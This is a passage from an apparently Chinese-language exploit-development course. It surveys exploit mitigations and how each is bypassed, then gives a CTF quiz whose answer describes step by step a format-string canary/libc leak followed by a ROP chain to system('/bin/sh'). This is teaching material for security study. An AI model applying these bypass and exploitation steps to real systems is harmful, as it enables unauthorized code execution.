pwn.college Kernel 模組（免費）、Linux Kernel Exploitation 倉庫（GitHub）、HackSys Extreme Vulnerable Driver（Windows Kernel 練習）、CTF 中的 pwn 題（kernel 類別）、LiveOverflow YouTube 系列。

漏洞利用緩解技術全覽

了解所有現代緩解技術的全貌，幫助在 Exploit 開發時快速判斷攻擊面和繞過策略。

緩解技術開啟條件保護範圍現狀 / 局限
NX / DEPCPU 硬體支援；gcc 默認開啟防止 Stack/Heap Shellcode 執行ROP 完全繞過；幾乎所有現代系統已啟用
ASLROS 層級（Linux /proc/sys/kernel/randomize_va_space=2）隨機化 Stack/Heap/mmap 地址資訊洩露可繞過；64-bit 熵值高（有效）；32-bit 可爆破
Stack Canarygcc -fstack-protector-strong（默認啟用）偵測 Stack 溢位（覆蓋返回地址前驗證）資訊洩露可繞過；不保護非棧記憶體
PIEgcc -fpie -pie（Ubuntu 默認啟用）程式基地址隨機化配合 ASLR 有效；資訊洩露可繞過；CTF 常關閉用於練習
RELROFull RELRO（gcc -Wl,-z,relro,-z,now）GOT 唯讀（防止 GOT 改寫攻擊）Full RELRO 有效；Partial RELRO 仍有攻擊面；現代 Linux 默認 Partial
Safe-Linkingglibc 2.32+tcache/fastbin fd 指標加密（位移 XOR）需要洩露 Heap 地址才能計算正確指標；部分場景仍可繞過
Shadow Stack（CET）Intel CET 硬體；glibc 2.34+ / Ubuntu 22.04+硬體維護 Shadow Stack，ret 指令驗證返回地址幾乎完全防止 ROP；需要 JOP（Jump-Oriented Programming）替代
CFI / CFGClang CFI；Windows CFG（Control Flow Guard）限制間接呼叫目標（只能跳轉到合法函式）精細 CFI 有效；粗粒度（如 CFG）仍有 JOP 繞過空間
小測驗
一個 CTF PWN 題目，checksec 輸出如下：
Arch: amd64-64-little | RELRO: Partial | Stack: Canary found | NX: enabled | PIE: No PIE
你找到一個格式化字串漏洞，並確認溢位偏移為 72 bytes。以下哪個攻擊路線是正確且完整的？
A直接注入 Shellcode + 覆蓋返回地址為 Stack 地址（NX 開啟，Shellcode 無法執行）
B用格式化字串洩露 Canary 和 libc 地址，再 ROP 呼叫 system("/bin/sh")，Payload 中包含正確的 Canary 值
CPIE 未開啟，所以可以直接硬編碼程式地址爆破 ASLR（ASLR 仍對 libc/Stack 生效）
D直接覆蓋返回地址為 win() 地址（Canary 保護存在，未保留原值將 abort）
正確！這道題有三個需要處理的保護：NX（不能用 Shellcode）、Canary（覆蓋返回地址前必須保留原值）、ASLR（libc 地址隨機化，需要洩露）。完整解題路線：（1）利用格式化字串漏洞（%N$016lx）洩露 Stack 上的 Canary 值和 libc 返回地址；（2）計算 libc 基地址和 system()/"/bin/sh" 的真實地址；（3）構造 Payload：72 bytes 填充 + 正確的 Canary + 8 bytes Saved RBP + pop_rdi gadget + /bin/sh + ret gadget + system()。No PIE 意味著程式本身的地址固定，方便找到 pop rdi gadget。
